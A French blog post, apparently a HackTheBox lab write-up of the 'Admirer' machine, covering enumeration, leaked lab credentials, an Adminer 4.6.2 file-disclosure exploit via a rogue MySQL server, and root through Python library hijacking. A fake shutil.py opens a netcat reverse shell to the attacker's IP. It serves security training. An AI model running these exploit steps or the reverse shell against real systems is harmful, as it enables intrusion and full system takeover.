@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    
+      <title>Admirer :: AlrikRr - BlogPost — Bienvenue sur mon BlogPost</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Hello, je vais vous présenter un Write-Up de la machine Admirer sur HackTheBox.
+Il s&amp;rsquo;agit de ma méthodologie, je ne suis en aucun cas un expert, si je suis sur HackTheBox c&amp;rsquo;est pour avant tout monter en compétences.
+Bonne lecture !
+ Nmap On commence par un nmap pour regarder les ports ouverts et avoir des numéros de version.
+On peut voir un ftp , j&amp;rsquo;ai essayé de me connecter en anonymous mais ca n&amp;rsquo;a pas fonctionné."/>
+<meta name="keywords" content="linux, tuto, programmation, python"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/writeup/admirer/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Admirer"/>
+<meta name="twitter:description" content="HackTheBox : Admirer"/>
+
+
+
+<meta property="og:title" content="Admirer" />
+<meta property="og:description" content="HackTheBox : Admirer" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/writeup/admirer/" />
+<meta property="article:published_time" content="2020-07-30T10:13:36+02:00" />
+<meta property="article:modified_time" content="2020-07-30T10:13:36+02:00" /><meta property="og:site_name" content="AlrikRr - BlogPost" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">AlrikRr - BlogPost</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+
+
+
+    <span class="header__right">
+      
+        <nav class="menu">
+	<ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+	<li><a href="/tuto">Les Tutos</a></li>
+        
+      
+        
+	<li><a href="/secu">Sécurité</a></li>
+        
+      
+        
+	<li><a href="/writeup">Write-Up</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Autres catégories
+            <span class="menu__sub-inner-more-trigger-icon"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+          </li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+	      <li><a href="/binary">Exploit-Binaire</a></li>
+              
+            
+              
+	      <li><a href="/iot">IOT</a></li>
+              
+            
+              
+	      <li><a href="/nixos">NIXOS</a></li>
+              
+            
+              
+	      <li><a href="/arch">Archlinux</a></li>
+              
+            
+              
+	      <li><a href="/ml">MachineLearning</a></li>
+              
+            
+              
+	      <li><a href="/about">A propos !</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/tuto">Les Tutos</a></li>
+      
+    
+      
+        <li><a href="/secu">Sécurité</a></li>
+      
+    
+      
+        <li><a href="/writeup">Write-Up</a></li>
+      
+    
+      
+        <li><a href="/binary">Exploit-Binaire</a></li>
+      
+    
+      
+        <li><a href="/iot">IOT</a></li>
+      
+    
+      
+        <li><a href="/nixos">NIXOS</a></li>
+      
+    
+      
+        <li><a href="/arch">Archlinux</a></li>
+      
+    
+      
+        <li><a href="/ml">MachineLearning</a></li>
+      
+    
+      
+        <li><a href="/about">A propos !</a></li>
+      
+    
+  </ul>
+</nav>
+
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/writeup/admirer/">Admirer</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          30-07-2020
+        </span>
+
+        
+      
+
+      <span class="post-author">— Ecrit par AlrikRr</span>
+      
+        <span class="post-read-time">— 4 Minutes</span>
+      
+    </div>
+
+    
+
+    
+      
+        <img src="/img/fr/writeup/admirer/htb-admirer.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      
+      <p><img src="/img/fr/writeup/admirer/admirer.png" alt="admirer"></p>
+<p>Hello, je vais vous présenter un Write-Up de la machine Admirer sur HackTheBox.</p>
+<p>Il s&rsquo;agit de ma méthodologie, je ne suis en aucun cas un expert, si je suis sur HackTheBox c&rsquo;est pour avant tout monter en compétences.</p>
+<p>Bonne lecture !</p>
+<hr>
+<h2 id="nmap">Nmap</h2>
+<p>On commence par un nmap pour regarder les ports ouverts et avoir des numéros de version.</p>
+<p><img src="/img/fr/writeup/admirer/nmap.png" alt="nmap"></p>
+<p>On peut voir un ftp , j&rsquo;ai essayé de me connecter en anonymous mais ca n&rsquo;a pas fonctionné.</p>
+<p>Dans le fichier <code>robots.txt</code> on peut voir un disallow sur <code>/admin-dir</code> c&rsquo;est le moment d&rsquo;aller y jeter un oeil.</p>
+<pre><code>User-agent: *
+
+# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+Disallow: /admin-dir
+</code></pre><h2 id="dirb">dirb</h2>
+<p>Pour rechercher des pages interessantes, j&rsquo;utilise dirb qui est la version sans GUI.</p>
+<p><code>dirb http://10.10.10.187/admin-dir /usr/share/dirb/wordlists/big.txt -X .txt,.db,.back</code></p>
+<p>On tombe sur des pages interessantes :</p>
+<ul>
+<li><code>http://10.10.10.187/admin-dir/contacts.txt</code></li>
+</ul>
+<pre><code>##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+</code></pre><ul>
+<li><code>http://10.10.10.187/admin-dir/credentials.txt</code></li>
+</ul>
+<pre><code>[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+</code></pre><h2 id="ftp">FTP</h2>
+<p>On a des creds FTP, on va les utiliser.</p>
+<p>On se sert du FTP pour récupérer <code>dump.sql</code> et <code>html.tar.gz</code>.</p>
+<p><img src="/img/fr/writeup/admirer/ftp.png" alt="ftp"></p>
+<p>Il n&rsquo;y a rien d&rsquo;intéressant dans le fichier sql.</p>
+<p>On extrait le fichier <code>tar.gz</code> qui contient le code source du site web.</p>
+<p><img src="/img/fr/writeup/admirer/zip.png" alt="zip"></p>
+<p>Le dossier <code>w4ld0s_s3cr3t_d1r</code> me tape dans l&rsquo;oeil.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">html/w4ld0s_s3cr3t_d1r ヤマト» cat credentials.txt 
+[Bank Account]
+waldo.11
+Ezy]m27}OREc$
+
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+</code></pre><p>Il y a un compte en plus.</p>
+<p>Dans le fichier <code>index.php</code> on peut aussi trouvé des creds :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> $servername = &#34;localhost&#34;;
+ $username = &#34;waldo&#34;;
+ $password = &#34;]F7jLHw:*G&gt;UPrTo}~A&#34;d6b&#34;;
+ $dbname = &#34;admirerdb&#34;;
+</code></pre></div><p>Le fichier <code>db_admin.php</code> contient aussi des creds :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> $servername = &#34;localhost&#34;;
+ $username = &#34;waldo&#34;;
+ $password = &#34;Wh3r3_1s_w4ld0?&#34;;
+</code></pre></div><p>On peut voir un dossier <code>utility_scripts</code>.</p>
+<p><img src="/img/fr/writeup/admirer/admin_tasks.png" alt="task"></p>
+<p>Pendant ce temps là, dirb a trouvé <code>adminer.php</code>.</p>
+<p><img src="/img/fr/writeup/admirer/adminer.png" alt="adminer"></p>
+<p>On va essayé de se connecter à la BDD SQL avec les creds que l&rsquo;on a pu trouver dans le fichier <code>index.php</code>.</p>
+<p>Malheureusement, ca ne fonctionne pas, l&rsquo;utilisateur n&rsquo;est pas autorisé à se connecter.<br>
+<img src="/img/fr/writeup/admirer/adminer_2.png" alt="adminer_2"></p>
+<h2 id="pause">Pause</h2>
+<p>Après une petite pause, je decide de trouver des exploit pour adminer 4.6.2.</p>
+<p>Et j&rsquo;en trouve un ici : <a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">adminer-4.6.2-file-disclosure-vulnerability</a></p>
+<p>Donc il y a moyen de recuperer les passwords en utilisant un autre server mysql.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf
+# Modification de l'adresse ip
+bind-address = 10.10.14.28
+</code></pre><pre><code class="language-bash/shell" data-lang="bash/shell">sudo service mysql start
+
+sudo mysql -u root
+
+# Creation d'une bdd
+MariaDB [(none)]&gt; CREATE DATABASE adminer_yamato;
+
+# Création d'un nouvel user dans la BDD de admirer
+MariaDB [(none)]&gt; GRANT ALL ON adminer_yamato.* TO yamato@'10.10.10.187' IDENTIFIED BY 'PASSWORD';
+
+</code></pre><p><img src="/img/fr/writeup/admirer/adminer_3.png" alt="adminer_3"></p>
+<p>Nous voila connecté avec le compte yamato !</p>
+<p><img src="/img/fr/writeup/admirer/adminer_4.png" alt="adminer_4"></p>
+<p>Création d&rsquo;un TABLE</p>
+<p><img src="/img/fr/writeup/admirer/adminer_5.png" alt="adminer_5"></p>
+<p>Execution de notre exploit en SQL :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">LOAD</span> <span style="color:#66d9ef">DATA</span> <span style="color:#66d9ef">LOCAL</span> INFILE <span style="color:#e6db74">&#39;/var/www/html/index.php&#39;</span>
+<span style="color:#66d9ef">INTO</span> <span style="color:#66d9ef">TABLE</span> exploit
+FIELDS TERMINATED <span style="color:#66d9ef">BY</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+</code></pre></div><p>Cet exploit va ecrire le fichier index.php dans notre TABLE.<br>
+Malheureusement avec <code>\n</code> certaines lignes ne sont pas prise en compte, don celle qui contient le mot de passe.</p>
+<p>On change légèrement notre exploit :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">LOAD</span> <span style="color:#66d9ef">DATA</span> <span style="color:#66d9ef">LOCAL</span> INFILE <span style="color:#e6db74">&#39;/var/www/html/index.php&#39;</span>
+<span style="color:#66d9ef">INTO</span> <span style="color:#66d9ef">TABLE</span> exploit
+FIELDS TERMINATED <span style="color:#66d9ef">BY</span> <span style="color:#e6db74">&#39;password&#39;</span>
+</code></pre></div><p>On devine que la variable qui contient le mot de passe s&rsquo;appelle password. Comme dans notre index.php actuel.</p>
+<p>Nous voila donc avec un mot de passe différent : <code>&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</code></p>
+<p>On va essayer de l&rsquo;utiliser sur le compte waldo en SSH</p>
+<h2 id="ssh">SSH</h2>
+<p>Le mot de passe fonctionne, nous voila avec un compte user.<br>
+<img src="/img/fr/writeup/admirer/ssh.png" alt="ssh"></p>
+<h2 id="root">ROOT</h2>
+<p>Maintenant, il nous faut le flag root.</p>
+<p>On regarde les droits sudo.<br>
+<img src="/img/fr/writeup/admirer/sudo.png" alt="sudo"></p>
+<p>On a des droits sur le script <code>/opt/scripts/admin_tasks.sh</code> , allons regarder tout ça.</p>
+<p><img src="/img/fr/writeup/admirer/ls.png" alt="ls"></p>
+<p>C&rsquo;est un genre de script pour executer des commandes admin genre crontab / uptime / user / backup etc ..</p>
+<p>A priori y a pas moyen de controuner le script bash</p>
+<p>Mais du coté du script python &hellip;</p>
+<p><img src="/img/fr/writeup/admirer/python.png" alt="python"></p>
+<h2 id="exploit-python">Exploit Python</h2>
+<p>On va essayé d&rsquo;exploit la librairy Python.<br>
+<a href="https://www.devdungeon.com/content/python-import-syspath-and-pythonpath-tutorial">python-import-syspath-and-pythonpath-tutorial</a></p>
+<p>Nous allons créer une fausse librairie <code>shutils.py</code>.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">waldo@admirer:~$ mkdir yamato
+waldo@admirer:~$ cd yamato/
+waldo@admirer:~/yamato$ touch shutil.py
+waldo@admirer:~/yamato$ chmod +x shutil.py
+</code></pre><p>Voici notre fichier shutils.py qui va contenir notre exploit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> subprocess
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_archive</span>(hello,friend,toto):
+ subprocess<span style="color:#f92672">.</span>getoutput(<span style="color:#e6db74">&#34;nc 10.10.14.28 8888 -e /bin/bash&#34;</span>)
+</code></pre></div><p>On va refaire la fonction make_archive avec des paramètre random car on les utilise pas, au final la commande nc va etre executer par le script python de backup.</p>
+<p>On indique le PYTHONPATH pendant l&rsquo;execution de la commande.</p>
+<p><code>sudo PYTHONPATH='/home/waldo/yamato' /opt/scripts/admin_tasks.sh</code></p>
+<p>De l&rsquo;autre coté, on se met en écoute avec nc.<br>
+<code>ヤマト» nc -nvlp 8888</code></p>
+<p>BOUM</p>
+<p>On a une connexion.</p>
+<p><img src="/img/fr/writeup/admirer/id.png" alt="id"></p>
+
+    </div>
+    
+
+
+    
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">@AlrikRr - 2020</div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
